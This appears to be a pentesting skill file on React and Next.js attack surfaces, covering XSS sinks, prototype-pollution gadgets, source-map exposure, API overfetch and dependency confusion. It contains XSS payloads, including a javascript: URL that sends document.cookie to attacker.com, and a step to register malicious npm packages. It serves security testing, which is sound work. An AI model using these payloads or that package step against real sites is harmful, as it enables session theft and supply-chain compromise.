---
name: react
description: React-specific attack surface: hydration mismatch, dangerouslySetInnerHTML, prototype pollution via state
depends_on: []
---

# React

React is a client-rendered framework. Server returns shell + JSON; the client hydrates. Most React-specific bugs are XSS via dangerouslySetInnerHTML, supply-chain (compromised npm packages), or hydration-mismatch DoS.

## Common Bug Classes

- Stored XSS via `dangerouslySetInnerHTML` rendering server-controlled HTML without sanitization
- Reflected XSS in URL-driven state when components blindly render `searchParams` content
- Prototype pollution via `Object.assign(state, userInput)` in older React+Redux stacks
- SSR injection if Next.js/Remix templates concatenate untrusted data into JSX strings
- DOM clobbering when component IDs collide with global properties
- Source map exposure leaking internal API URLs and admin routes

## Dangerous Rendering API Audit

The primary React-specific XSS surface. Systematic hunt:

```bash
# Find all dangerous rendering sinks in codebase
grep -rn "dangerouslySetInnerHTML" src/
grep -rn "innerHTML" src/
grep -rn "messageHtml\|htmlContent\|rawHtml\|unsafeHtml" src/

# For each sink, trace the data source:
# 1. Does it come from user input (stored or reflected)?
# 2. Does it pass through a sanitizer (DOMPurify, sanitize-html)?
# 3. Is the sanitizer configured to strip ALL dangerous content?
```

**Key insight:** `dangerouslySetInnerHTML` is well-known, but many React apps use wrapper components that hide the danger:
- `<RichTextRenderer content={...} />` — internally uses `dangerouslySetInnerHTML`
- `<MarkdownPreview source={...} />` — renders raw HTML from markdown
- `<HtmlContent html={...} />` — custom component wrapping innerHTML

Grep for these wrapper patterns and trace whether they sanitize before rendering.

## Prototype Pollution to XSS Gadgets

Once you have a prototype pollution primitive on a React app, search for these gadgets:

- `defaultProps` pollution: `Object.prototype.dangerouslySetInnerHTML = {__html: '<img src=x onerror=alert(1)>'}`
- Redux store pollution: `Object.prototype.isAdmin = true` affecting authorization checks
- `react-router` config pollution: `Object.prototype.to = 'javascript:alert(1)'` on `<Link>` components
- Lodash/jQuery-based gadgets in the dependency tree

**PP sources in React apps:**
```
# Common merge patterns
Object.assign(state, userInput)
{...props, ...userControlled}
lodash.merge(config, req.body)
```

## URL Scheme XSS in React Components

React prevents most XSS but does NOT block `javascript:` in URL contexts:

```jsx
// Vulnerable: React does NOT sanitize href values
<a href={userInput}>Click</a>

// Vulnerable: router.push with user input
router.push(userControlledUrl)

// Test payloads
javascript:alert(document.domain)
javascript:void(document.location='https://attacker.com/?c='+document.cookie)
```

**Redirect parameter sweep:** Test every URL parameter named `home`, `redirect`, `redirect_uri`, `next`, `return`, `returnUrl`, `continue`, `dest`, `back`, `callback`, `logout` for `javascript:` scheme acceptance.

## SSR/Next.js Specific Attacks

Next.js adds server-side rendering surfaces beyond standard React:

**`__NEXT_DATA__` exploitation:**
```
# Inspect page source for __NEXT_DATA__ script tag
# Contains: props, query params, build ID, runtime config
# Look for: internal API URLs, feature flags, user data, admin routes
```

**Server Component injection:** In Next.js 13+ App Router, Server Components can execute on the server. Test if user input flows into:
- `fetch()` calls (SSRF)
- File system operations
- Database queries
- Template literal interpolation

**Source map exposure:**
```
/_next/static/*.js.map        # Next.js source maps
/static/js/*.chunk.js.map     # Create React App source maps
/sourcemaps/*.map             # Custom source map paths
```

## Component Trust Boundary Audit

For every React component that accepts HTML or renders rich content:

1. Check if the component docs say "expects sanitized HTML" — this means it does NOT sanitize
2. Grep for components using `dangerouslySetInnerHTML` or `ref.current.innerHTML`
3. For each, trace all callers: does EVERY caller sanitize before passing HTML?
4. Test: what happens if sanitization is bypassed at ONE caller? The component trusts ALL callers

**Sanitizer wrapper libraries are a recurring XSS reservoir:**
- `react-marked-markdown`, `react-autolinker-wrapper`, `react-html-parser`
- Any library whose purpose is `string → safe-looking HTML`
- Check: does the library actually sanitize, or just render?

## SPA API Overfetch Detection

React SPAs make API calls that may return more data than the UI displays:

1. Proxy ALL traffic through Burp during every UI action
2. Note every distinct API URL pattern triggered by the UI
3. Compare: what does the API return vs what the UI renders?
4. Hidden fields in API responses (admin flags, internal IDs, PII) are information disclosure
5. Check versioned API endpoints: `/api/v1/profile` may return different fields than `/api/v2/profile`

## Dependency Confusion

React projects with private npm packages are vulnerable:

1. Read `package.json` for package names that don't exist on public npm
2. Check scoped packages (`@company/...`) — is the scope claimed on npm?
3. Unscoped packages with private names → register on npm with malicious code
4. Check `package-lock.json` for resolved registry URLs (mix of private/public = confusion risk)

## Probe Targets

- Inspect `/static/js/*.chunk.js` for endpoint strings, secrets, internal admin paths
- Search bundle for `dangerouslySetInnerHTML` usage and trace data sources
- Check `/sourcemaps/*.map` and `/_next/static/*.js.map` accessibility
- Probe `__NEXT_DATA__` script JSON for hidden routes and props
- Test components that render Markdown/HTML user input for XSS
- Inspect Redux DevTools extension for state exposure in production
- Test `javascript:` scheme in all `<a href>` and `router.push` destinations
- Check for exposed `.env.local` or `.env.production` via path traversal

## Cross-References

`xss`, `spa_client_side`, `js_analysis`, `frontend_backend_parity`, `js_deobfuscation`, `prototype_pollution`

## Validation Requirements

- Reproduce findings with at least one alternate principal where authz is involved
- Verify version disclosure aligns with the CVE list before claiming version-specific impact
- Distinguish "tech detected" from "tech vulnerable" — many fingerprints just identify the stack
- For XSS: demonstrate cookie theft or session hijack, not just `alert(1)`
- For API overfetch: show the leaked data is actually sensitive, not just extra metadata
